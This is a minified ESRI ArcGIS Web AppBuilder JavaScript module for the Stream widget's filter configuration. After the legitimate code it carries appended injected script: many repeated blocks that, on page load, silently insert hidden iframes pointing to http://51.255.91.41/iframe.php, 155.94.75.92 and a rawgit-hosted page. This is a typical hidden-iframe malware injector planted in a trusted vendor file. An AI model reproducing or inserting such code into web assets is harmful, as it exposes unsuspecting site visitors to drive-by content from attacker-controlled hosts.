// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Stream/setting/FilterConfig.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"stream-filter-head" style\x3d"overflow:hidden;"\x3e\r\n    \x3cdiv class\x3d"jimu-float-leading"\x3e\r\n      \x3cdiv class\x3d"add-with-icon" data-dojo-attach-event\x3d"onclick:_addFilter"\x3e\r\n        \x3cspan class\x3d"jimu-icon jimu-icon-add"\x3e\x3c/span\x3e\r\n        \x3cspan class\x3d"add-label jimu-widget-normal"\x3e${nls.addNew}\x3c/span\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"stream-filterList"\x3e\r\n    \x3cdiv class\x3d"stream-filterList-content"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"filterList"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"single-filter-container" data-dojo-attach-point\x3d"singleFilterContainer"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/dom-style dojo/dom-class dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./FilterConfig.html ./SingleFilter jimu/dijit/Message jimu/dijit/SimpleTable jimu/dijit/LoadingShelter".split(" "),function(h,d,g,f,c,k,l,m,n,p,q,r,t){return h([l,m,n],{baseClass:"jimu-widget-stream-filter",templateString:p,streamLayer:null,config:null,postCreate:function(){this.inherited(arguments);this.filterList=new t({autoHeight:!1,
selectable:!0,fields:[{name:"name",title:this.nls.name,width:"auto",type:"text",editable:!1},{name:"actions",title:"",width:"70px",type:"actions",actions:["up","down","delete"]}]},this.filterList);k.add(this.filterList.domNode,"stream-filter-table");c.set(this.filterList.domNode,"height","100%");this.own(f(this.filterList,"row-select",d.hitch(this,this._onFilterSelected)));this.own(f(this.filterList,"row-delete",d.hitch(this,this._onFilterRemoved)));this.filterList.startup();this.config&&0<this.config.length&&
this._applyConfig()},_applyConfig:function(){this.filterList.clear();g.forEach(this.config,d.hitch(this,function(b,a){var e=this.filterList.addRow({name:b.name||this.nls.newFilter}).tr;this._createFilter(e,b);0===a&&this.filterList.selectRow(e)}))},getConfig:function(){var b,a=[];g.forEach(this.filterList.getRows(),function(e){b=e.filter;a.push(b.getConfig())});return a},_addFilter:function(){var b;b=this.filterList.addRow({name:this.nls.newFilter});b.success?(b=b.tr,this._createFilter(b,{name:this.nls.newFilter}),
this.filterList.selectRow(b)):new r({message:this.nls.addFilterFailed})},_onFilterSelected:function(b){var a;this.currentTR?this.currentTR!==b&&((a=this.currentTR.filter)&&c.set(a.domNode,"display","none"),this.currentTR=b,(a=this.currentTR.filter)&&c.set(a.domNode,"display","block")):(this.currentTR=b,(a=this.currentTR.filter)&&c.set(a.domNode,"display","block"))},_onFilterRemoved:function(b){var a=b.filter;a&&(a.destroy(),b.filter=null)},_createFilter:function(b,a){a=new q({config:a,streamLayer:this.streamLayer,
nls:this.nls});a.placeAt(this.singleFilterContainer);b.filter=a;this.own(f(a,"filterNameChanged",d.hitch(this,function(a){this.filterList.editRow(b,{name:a})})));c.set(a.domNode,"display","none")}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});